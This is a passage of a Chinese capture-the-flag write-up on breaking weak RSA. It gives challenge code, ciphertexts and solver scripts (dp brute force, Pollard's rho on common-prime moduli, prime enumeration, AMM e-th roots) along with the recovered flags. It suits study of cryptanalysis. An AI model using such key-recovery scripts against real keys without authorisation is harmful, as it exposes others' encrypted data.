class="number">1</span>:</span><br><span class="line">    d = crt([dp,dq],[p-<span class="number">1</span>,q-<span class="number">1</span>])</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    R = Integers(phi)</span><br><span class="line">    e = R(d)^-<span class="number">1</span></span><br><span class="line">    return p*q,e</span><br><span class="line">n,e = key_gen()</span><br><span class="line">print e</span><br><span class="line">print n</span><br><span class="line">print <span class="built_in">pow</span>(flagn,int(e),n)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">e = <span class="number">29535442680028</span><span class="number">66703872076551</span><span class="number">93095372257231</span><span class="number">71227778612992</span><span class="number">93407053391808</span><span class="number">19922065528923</span><span class="number">59830889863726</span><span class="number">30141821049118</span><span class="number">01575201741264</span><span class="number">21489341137231</span><span class="number">74855236142887</span></span><br><span class="line">N = <span class="number">60061281212761</span><span class="number">72470274143101</span><span class="number">47361996375072</span><span class="number">59424584501192</span><span class="number">52491144009018</span><span class="number">46984591798652</span><span class="number">30077488313626</span><span class="number">74341219814935</span><span class="number">24170302602443</span><span class="number">13905313231276</span><span class="number">20970750816983</span></span><br><span class="line">flag = <span class="number">40827774686624</span><span class="number">93175049853412</span><span class="number">96891398047298</span><span class="number">62154972477739</span><span class="number">11290709560282</span><span class="number">22305386351302</span><span class="number">99851158554168</span><span class="number">47643274608394</span><span class="number">46781339111746</span><span class="number">38178050007541</span><span class="number">91093158289399</span></span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>可以看到dp的范围是在[1,1048576]，这个范围应该是可以进行穷举的  -&gt; dp已知</p><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">2953544268002866703872076551930953722572317122777861299293407053391808199220655289235983088986372630141821049118015752017412642148934113723174855236142887</span></span><br><span class="line">n = <span class="number">6006128121276172470274143101473619963750725942458450119252491144009018469845917986523007748831362674341219814935241703026024431390531323127620970750816983</span></span><br><span class="line">c = <span class="number">4082777468662493175049853412968913980472986215497247773911290709560282223053863513029985115855416847643274608394467813391117463817805000754191093158289399</span></span><br><span class="line"><span class="comment">#dp = d % (p-1)     dq = d % (q-1)</span></span><br><span class="line"></span><br><span class="line">m = <span class="number">10000001</span></span><br><span class="line"><span class="keyword">for</span> dp <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,(<span class="number">1</span>&lt;&lt;<span class="number">20</span>)+<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(dp)</span><br><span class="line">    temp = <span class="built_in">pow</span>(m,e*dp,n) - m</span><br><span class="line">    p = gmpy2.gcd(n,temp)</span><br><span class="line">    <span class="keyword">if</span> p != <span class="number">1</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            flag = long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">b&#x27;ctf&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line"><span class="comment">#dp = 915155</span></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;d67fde91-f6c0-484d-88a4-1778f7fa0c05&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>因 e⋅dp≡1(mod(p−1))，又由费马小定理，对<strong>r (大于1的整数 且 gcd(p, r)=1)</strong>，有 $r^{e⋅dp} ≡ r (modp)$，即 $p | (r^{e⋅dp} − r)$；</p><p>又 p | n，很大概率 <strong>$p=gcd(r^{e·dp} − r, n)$</strong></p><ul><li>当dp较小且已知，e又较大时，对<strong>任意 m</strong>，<strong>$p=gcd(r^{e·dp} − r, n)$</strong></li></ul><h2 id="Easy-Rsa-｜-p-1、q-1有公因子"><a href="#Easy-Rsa-｜-p-1、q-1有公因子" class="headerlink" title="Easy_Rsa    ｜ p-1、q-1有公因子"></a>Easy_Rsa    ｜ p-1、q-1有公因子</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">nbits, gamma</span>):</span></span><br><span class="line">    g = getPrime(<span class="built_in">int</span>(nbits * gamma))</span><br><span class="line">    alpha = <span class="number">0.5</span> - gamma</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">        p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">            q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            h = <span class="number">2</span> * g * a * b + a + b</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> isPrime(q) <span class="keyword">or</span> isPrime(h) <span class="keyword">or</span> gmpy2.gcd(a, b) != <span class="number">1</span>:</span><br><span class="line">                b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">                q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">nbits, gamma</span>):</span></span><br><span class="line">    p, q = gen_prime(nbits, gamma)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = getPrime(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">while</span> gmpy2.gcd(e, gmpy2.lcm(p-<span class="number">1</span>,q-<span class="number">1</span>)) != <span class="number">1</span>:</span><br><span class="line">        e = getPrime(<span class="number">16</span>)</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="keyword">return</span> n, e, c</span><br><span class="line"></span><br><span class="line">n, e, c = encrypt(<span class="number">1024</span>, <span class="number">0.48</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;n =&#x27;</span>, n</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;e =&#x27;</span>, e</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c =&#x27;</span>, c</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line"><span class="comment"># e = 58337</span></span><br><span class="line"><span class="comment"># c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br></pre></td></tr></table></figure><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pollard’s rho</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rho</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Factorizing&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1 = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        x2 = f(x1, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = gmpy2.gcd(<span class="built_in">abs</span>(x1 - x2), n)</span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span> <span class="keyword">and</span> isPrime(p):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Found!&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x1 = f(x1, n)</span><br><span class="line">                x2 = f(f(x2, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line">e = <span class="number">58337</span></span><br><span class="line">c = <span class="number">13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br><span class="line"></span><br><span class="line">p, q = rho(n)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Factorizing</span></span><br><span class="line"><span class="comment"># Found!</span></span><br><span class="line"><span class="comment"># b&#x27;SangFor&#123;0a8c2220-4c1b-32c8-e8c1-adf92ec7678b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><h4 id="Common-Prime-RSA"><a href="#Common-Prime-RSA" class="headerlink" title="Common Prime RSA"></a>Common Prime RSA</h4><p>情形：gcd(p−1,q−1)=g</p><p>分解的n方法有四种：</p><p>（1）<strong>修改Pollard’s rho方法分解n；</strong></p><p>（2）知道a、b的值分解n；</p><p>（3）知道g的值分解n；</p><p>（4）分解N-1。</p><h2 id="baby-rsa-｜-p-q-v-i-m-i-1-−-v-i-1-m-i"><a href="#baby-rsa-｜-p-q-v-i-m-i-1-−-v-i-1-m-i" class="headerlink" title="baby_rsa    ｜$p, q=v_i^{m_i+1}−(v_i+1)^{m_i}$"></a><strong>baby_rsa</strong>    ｜$p, q=v_i^{m_i+1}−(v_i+1)^{m_i}$</h2><ul><li><a href="https://blog.csdn.net/qq_52193383/article/details/120392517?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_52193383/article/details/120392517?spm=1001.2014.3001.5502</a></li></ul><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, v1, v2, m1, m2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc_1</span>(<span class="params">val</span>):</span></span><br><span class="line">    p, q = <span class="built_in">pow</span>(v1, (m1+<span class="number">1</span>))-<span class="built_in">pow</span>((v1+<span class="number">1</span>), m1), <span class="built_in">pow</span>(v2, (m2+<span class="number">1</span>))-<span class="built_in">pow</span>((v2+<span class="number">1</span>), m2)</span><br><span class="line">    <span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q) <span class="keyword">and</span> (p*q).bit_length() == <span class="number">2048</span> <span class="keyword">and</span> q &lt; p &lt; q &lt;&lt; <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(val, <span class="number">0x10001</span>, p*q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc_2</span>(<span class="params">val</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> val.bit_length() &lt; <span class="number">512</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        fac = [getPrime(<span class="number">512</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">        <span class="keyword">if</span> isPrime(((fac[<span class="number">0</span>]+fac[<span class="number">1</span>]+fac[<span class="number">2</span>]) &lt;&lt; <span class="number">1</span>) - <span class="number">1</span>):</span><br><span class="line">            n = fac[<span class="number">0</span>]*fac[<span class="number">1</span>]*fac[<span class="number">2</span>]*(((fac[<span class="number">0</span>]+fac[<span class="number">1</span>]+fac[<span class="number">2</span>]) &lt;&lt; <span class="number">1</span>) - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    c = <span class="built_in">pow</span>(val, <span class="number">0x10001</span>, n)</span><br><span class="line">    <span class="keyword">return</span> (c, n, ((fac[<span class="number">0</span>]+fac[<span class="number">1</span>]+fac[<span class="number">2</span>]) &lt;&lt; <span class="number">1</span>) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line">    plain1 = bytes_to_long(flag[:<span class="number">21</span>])</span><br><span class="line">    plain2 = bytes_to_long(flag[<span class="number">21</span>:])</span><br><span class="line">    <span class="built_in">print</span>(enc_1(plain1))</span><br><span class="line">    <span class="built_in">print</span>(enc_2(plain2))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">15808773921165746378224649554032774095198531782455904169552223303513940968292896814159288417499220739875833754573943607047855256739976161598599903932981169979509871591999964856806929597805904134099901826858367778386342376768508031554802249075072366710038889306268806744179086648684738023073458982906066972340414398928411147970593935244077925448732772473619783079328351522269170879807064111318871074291073581343039389561175391039766936376267875184581643335916049461784753341115227515163545709454746272514827000601853735356551495685229995637483506735448900656885365353434308639412035003119516693303377081576975540948311</span></span><br><span class="line"><span class="string">(40625981017250262945230548450738951725566520252163410124565622126754739693681271649127104109038164852787767296403697462475459670540845822150397639923013223102912674748402427501588018866490878394678482061561521253365550029075565507988232729032055298992792712574569704846075514624824654127691743944112075703814043622599530496100713378696761879982542679917631570451072107893348792817321652593471794974227183476732980623835483991067080345184978482191342430627490398516912714451984152960348899589532751919272583098764118161056078536781341750142553197082925070730178092561314400518151019955104989790911460357848366016263083, 43001726046955078981344016981790445980199072066019323382068244142888931539602812318023095256474939697257802646150348546779647545152288158607555239302887689137645748628421247685225463346118081238718049701320726295435376733215681415774255258419418661466010403928591242961434178730846537471236142683517399109466429776377360118355173431016107543977241358064093102741819626163467139833352454094472229349598479358367203452452606833796483111892076343745958394932132199442718048720633556310467019222434693785423996656306612262714609076119634814783438111843773649519101169326072793596027594057988365133037041133566146897868269, 39796272592331896400626784951713239526857273168732133046667572399622660330587881579319314094557011554851873068389016629085963086136116425352535902598378739)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p><strong>en1</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220430162816044.png" alt="条件"></p><p>p，q的比特长度均小于2048（应该更小）。我们可以通过这个条件来枚举v和m，求出该范围内的所有素数，然后再从中选取任意两个素数，求n，长度若为2048bits，则尝试解密。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"><span class="attribute">from</span> Crypto.Util.number import *</span><br><span class="line"><span class="comment">#enc_1</span></span><br><span class="line"><span class="attribute">c1</span> = <span class="number">15808773921165746378224649554032774095198531782455904169552223303513940968292896814159288417499220739875833754573943607047855256739976161598599903932981169979509871591999964856806929597805904134099901826858367778386342376768508031554802249075072366710038889306268806744179086648684738023073458982906066972340414398928411147970593935244077925448732772473619783079328351522269170879807064111318871074291073581343039389561175391039766936376267875184581643335916049461784753341115227515163545709454746272514827000601853735356551495685229995637483506735448900656885365353434308639412035003119516693303377081576975540948311</span></span><br><span class="line"><span class="attribute">e1</span> = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">primes</span> =<span class="meta"> []</span></span><br><span class="line"><span class="attribute">for</span> x in range(<span class="number">500</span>):</span><br><span class="line">    <span class="attribute">for</span> y in range(<span class="number">500</span>):</span><br><span class="line">        <span class="attribute">num</span> = pow(x, (y+<span class="number">1</span>))-pow((x+<span class="number">1</span>), y)</span><br><span class="line">        <span class="attribute">if</span> len(bin(num)[<span class="number">2</span>:]) &lt; <span class="number">2048</span>:</span><br><span class="line">            <span class="attribute">if</span> isPrime(num):</span><br><span class="line">                <span class="attribute">primes</span>.append(num)</span><br><span class="line"></span><br><span class="line"><span class="attribute">for</span> p in primes:</span><br><span class="line">    <span class="attribute">for</span> q in primes:</span><br><span class="line">        <span class="attribute">n1</span> = p*q</span><br><span class="line">        <span class="attribute">if</span> len(bin(n<span class="number">1</span>)[<span class="number">2</span>:]) == <span class="number">2048</span>:</span><br><span class="line">            <span class="attribute">try</span>:</span><br><span class="line">                <span class="attribute">d1</span> = gmpy<span class="number">2</span>.invert(e<span class="number">1</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">                <span class="attribute">flag</span> = long_to_bytes(pow(c<span class="number">1</span>,d<span class="number">1</span>,n<span class="number">1</span>))</span><br><span class="line">                <span class="attribute">if</span> b&#x27;flag&#x27; in flag or b&#x27;ctf&#x27; in flag:</span><br><span class="line">                    <span class="attribute">print</span>(flag)</span><br><span class="line">            <span class="attribute">except</span>:</span><br><span class="line">                <span class="attribute">pass</span></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;8102c552-3d78-4a&#x27;            </span></span><br></pre></td></tr></table></figure><blockquote><p> <strong>en2</strong></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e2 = <span class="number">0x10001</span></span><br><span class="line">c2, n2, p = (<span class="number">40625981017250262945230548450738951725566520252163410124565622126754739693681271649127104109038164852787767296403697462475459670540845822150397639923013223102912674748402427501588018866490878394678482061561521253365550029075565507988232729032055298992792712574569704846075514624824654127691743944112075703814043622599530496100713378696761879982542679917631570451072107893348792817321652593471794974227183476732980623835483991067080345184978482191342430627490398516912714451984152960348899589532751919272583098764118161056078536781341750142553197082925070730178092561314400518151019955104989790911460357848366016263083</span>, <span class="number">43001726046955078981344016981790445980199072066019323382068244142888931539602812318023095256474939697257802646150348546779647545152288158607555239302887689137645748628421247685225463346118081238718049701320726295435376733215681415774255258419418661466010403928591242961434178730846537471236142683517399109466429776377360118355173431016107543977241358064093102741819626163467139833352454094472229349598479358367203452452606833796483111892076343745958394932132199442718048720633556310467019222434693785423996656306612262714609076119634814783438111843773649519101169326072793596027594057988365133037041133566146897868269</span>, <span class="number">39796272592331896400626784951713239526857273168732133046667572399622660330587881579319314094557011554851873068389016629085963086136116425352535902598378739</span>)</span><br><span class="line"><span class="built_in">print</span>(gmpy2.is_prime(p))</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">phi2 = (<span class="number">191</span>-<span class="number">1</span>)*(<span class="number">193</span>-<span class="number">1</span>)*(<span class="number">627383</span>-<span class="number">1</span>)*(<span class="number">1720754738477317127758682285465031939891059835873975157555031327070111123628789833299433549669619325160679719355338187877758311485785197492710491</span>-<span class="number">1</span>)</span><br><span class="line">d2 = <span class="built_in">int</span>(gmpy2.invert(e2, phi2))</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line"><span class="comment"># #b&#x27;42-b659-0c96ef827f05&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p> 舍掉合数</p><p> <strong>值得注意，剩下的居然还是个合数，得拆了求其phi</strong></p></blockquote><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220430162816044.png" alt="条件"></p><ul><li>穷举所有v，m(即穷举所有p、q)</li></ul><h2 id="special-rsa-e-p-1-amp-e-q-1"><a href="#special-rsa-e-p-1-amp-e-q-1" class="headerlink" title="special_rsa    |  (e|p-1) &amp; (e|q-1)"></a>special_rsa    |  (e|p-1) &amp; (e|q-1)</h2><blockquote><p>有限域开e次方，解决问题。</p><p><strong>但e不能太大</strong>🤔</p></blockquote><ul><li><a href="https://blog.csdn.net/LaniakeaHarry/article/details/124384460?spm=1001.2014.3001.5502">https://blog.csdn.net/LaniakeaHarry/article/details/124384460?spm=1001.2014.3001.5502</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">53296318153341311013989348488093143123693921875654781175946491674187297</span></span><br><span class="line">p = <span class="number">953730950786751671162019537171974567</span></span><br><span class="line">q = <span class="number">1189933229053113361422958527792232151</span></span><br><span class="line">e = <span class="number">113</span></span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^e-c</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^e-c</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q])</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(solution)))</span><br></pre></td></tr></table></figure><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><ul><li>(e|p-1) &amp; (e|q-1)， AMM算法解决</li></ul><h2 id="CVE-OF-RSA-｜p-km-65537-a-n"><a href="#CVE-OF-RSA-｜p-km-65537-a-n" class="headerlink" title="CVE OF RSA    ｜p=km+(65537*a % n)"></a>CVE OF RSA    ｜p=k<em>m+(65537*</em>a % n)</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">special_rsa</span>(<span class="params">self</span>):</span></span><br><span class="line">    kbits = <span class="number">37</span></span><br><span class="line">    abit = <span class="number">62</span></span><br><span class="line">    M = <span class="number">962947420735983927056946215901134429196419130606213075415963491270</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = getRandomNBitInteger(kbits)</span><br><span class="line">        a = getRandomNBitInteger(abit)</span><br><span class="line">        p = k * M + <span class="built_in">pow</span>(<span class="number">0x10001</span>, a, M)</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">while</span> <span 